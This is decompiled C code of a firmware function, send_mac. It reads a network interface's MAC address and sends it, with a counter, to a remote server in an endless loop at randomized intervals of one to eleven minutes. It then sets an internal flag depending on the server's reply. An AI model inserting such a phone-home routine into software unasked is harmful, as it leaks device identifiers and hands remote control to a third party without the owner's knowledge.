
/* WARNING: Unknown calling convention */

void * send_mac(void)

{
  char *pcVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  size_t sVar5;
  int selret;
  uint uVar6;
  uint uVar7;
  int flags;
  int *piVar8;
  int n;
  ssize_t sVar9;
  int recv_bytes;
  addrinfo *__ai;
  int *nNetTimeout;
  addrinfo *p;
  addrinfo *paVar10;
  int sockd;
  byte *pbVar11;
  addrinfo **servinfo;
  uint __i;
  addrinfo *local_cb8;
  int local_cb4;
  int *local_cb0;
  addrinfo **local_cac;
  char *local_ca8;
  undefined4 local_c88;
  addrinfo *local_c7c;
  socklen_t len;
  int local_c74;
  timeval tv_timeout;
  ifreq ifreq;
  addrinfo hints;
  char s [1024];
  char rec [1024];
  
  mac = (char *)malloc(0x20);
  iVar2 = socket(2,1,0);
  if (iVar2 < 0) {
    perror(DAT_0002a9ac);
    local_cb4 = DAT_0002a9b0;
    local_c88 = DAT_0002a9b4;
  }
  else {
    ifreq.ifr_ifrn._0_4_ = *DAT_0002a8ac;
    ifreq.ifr_ifrn.ifrn_name[4] = (char)DAT_0002a8ac[1];
    iVar3 = ioctl(iVar2,0x8927,&ifreq);
    if (iVar3 < 0) {
      perror(DAT_0002a9b8);
      local_cb4 = DAT_0002a9b0;
      close(iVar2);
      local_c88 = DAT_0002a9b4;
    }
    else {
      pbVar11 = (byte *)(ifreq.ifr_ifru.ifru_slave + 1);
      iVar3 = 0;
      do {
        pbVar11 = pbVar11 + 1;
        pcVar4 = mac + iVar3;
        iVar3 = iVar3 + 3;
        sprintf(pcVar4,DAT_0002a8b0,(uint)*pbVar11);
      } while (iVar3 != 0x12);
      pcVar4 = *DAT_0002a8b4;
      local_cb4 = DAT_0002a8b8;
      local_c88 = DAT_0002a8bc;
      sVar5 = strlen(pcVar4);
      pcVar4[sVar5 - 1] = '\0';
      close(iVar2);
    }
  }
  local_cb8 = (addrinfo *)&hints;
  local_ca8 = s;
  local_cac = &local_c7c;
  local_cb0 = &local_c74;
  do {
    pcVar1 = mac;
    pcVar4 = DAT_0002a8c0;
    iVar2 = *(int *)(local_cb4 + 0xc) + 1;
    *(int *)(local_cb4 + 0xc) = iVar2;
    snprintf(local_ca8,0x400,pcVar4,pcVar1,iVar2,local_c88);
    hints.ai_protocol = 0;
    hints.ai_family = 0;
    hints.ai_addr = (sockaddr *)0x0;
    hints.ai_addrlen = 0;
    hints.ai_flags = 0;
    hints.ai_canonname = (char *)0x0;
    hints.ai_next = (addrinfo *)0x0;
    hints.ai_socktype = 1;
    iVar2 = getaddrinfo(DAT_0002a8c4,DAT_0002a8c8,local_cb8,local_cac);
    if (iVar2 == 0) {
      if (local_c7c == (addrinfo *)0x0) {
        __ai = (addrinfo *)0x0;
      }
      else {
        paVar10 = local_c7c;
        do {
          uVar6 = socket(paVar10->ai_family,paVar10->ai_socktype,paVar10->ai_protocol);
          if (uVar6 != 0xffffffff) {
            uVar7 = fcntl(uVar6,3,0);
            fcntl(uVar6,4,uVar7 | 0x800);
            iVar2 = connect(uVar6,paVar10->ai_addr,paVar10->ai_addrlen);
            if (iVar2 != -1) {
LAB_0002a7ee:
              block_socket(uVar6);
              block_socket(uVar6);
              local_c74 = 10;
              setsockopt(uVar6,1,0x15,local_cb0,4);
              setsockopt(uVar6,1,0x14,local_cb0,4);
              sVar5 = strlen(local_ca8);
              send(uVar6,local_ca8,sVar5,0);
              memset((fd_set *)rec,0,0x400);
              sVar9 = recv(uVar6,(fd_set *)rec,0x400,0);
              if (sVar9 < 1) {
                freeaddrinfo(local_c7c);
                close(uVar6);
                *(undefined *)(local_cb4 + 9) = 0;
              }
              else {
                pcVar4 = strstr((char *)(fd_set *)rec,DAT_0002a8cc);
                if (pcVar4 != (char *)0x0) {
                  pcVar4 = (char *)0x1;
                }
                freeaddrinfo(local_c7c);
                close(uVar6);
                *(char *)(local_cb4 + 9) = (char)pcVar4;
                if (pcVar4 != (char *)0x0) {
                  if (((*DAT_0002a99c != '\0') || (*DAT_0002a9a0 != '\0')) || (4 < *DAT_0002a9a4)) {
                    rec._0_4_ = *DAT_0002a9a8;
                    rec._4_4_ = DAT_0002a9a8[1];
                    rec._8_4_ = DAT_0002a9a8[2];
                    rec._12_2_ = (undefined2)DAT_0002a9a8[3];
                    rec[14] = (char)((uint)DAT_0002a9a8[3] >> 0x10);
                    _applog(5,(char *)(fd_set *)rec,false);
                  }
                  free(mac);
                  return (void *)0x0;
                }
              }
              goto LAB_0002a870;
            }
            tv_timeout.tv_sec = 10;
            tv_timeout.tv_usec = 0;
            piVar8 = __errno_location();
            if (*piVar8 == 0x73) {
              uVar7 = uVar6 + 0x1f & (int)uVar6 >> 0x20;
              if (((int)uVar6 >> 0x1e & 1U) == 0) {
                uVar7 = uVar6;
              }
              iVar2 = (int)uVar7 >> 5;
              uVar7 = 0;
              while( true ) {
                for (; uVar7 < 0x20; uVar7 = uVar7 + 1) {
                  ((fd_set *)rec)->fds_bits[uVar7] = 0;
                }
                __i = ((fd_set *)rec)->fds_bits[iVar2];
                ((fd_set *)rec)->fds_bits[iVar2] = 1 << ((int)uVar6 % 0x20 & 0xffU) | __i;
                iVar3 = select(uVar6 + 1,(fd_set *)0x0,(fd_set *)rec,(fd_set *)0x0,
                               (timeval *)&tv_timeout);
                if (0 < iVar3) break;
                if ((iVar3 == 0) || (*piVar8 != 4)) goto LAB_0002a71e;
                rec[0] = '\0';
                rec[1] = '\0';
                rec[2] = '\0';
                rec[3] = '\0';
                uVar7 = 1;
              }
              if ((((fd_set *)rec)->fds_bits[iVar2] >> ((int)uVar6 % 0x20 & 0xffU) & 1U) != 0) {
                len = 4;
                iVar2 = getsockopt(uVar6,1,4,local_cb0,&len);
                if ((iVar2 == 0) && (local_c74 == 0)) goto LAB_0002a7ee;
              }
            }
LAB_0002a71e:
            close(uVar6);
          }
          paVar10 = paVar10->ai_next;
          __ai = local_c7c;
        } while (paVar10 != (addrinfo *)0x0);
      }
      freeaddrinfo(__ai);
    }
    *(undefined *)(local_cb4 + 9) = 0;
LAB_0002a870:
    uVar6 = time((time_t *)0x0);
    srand(uVar6);
    iVar2 = rand();
    sleep(iVar2 % 600 + 0x3c);
  } while( true );
}

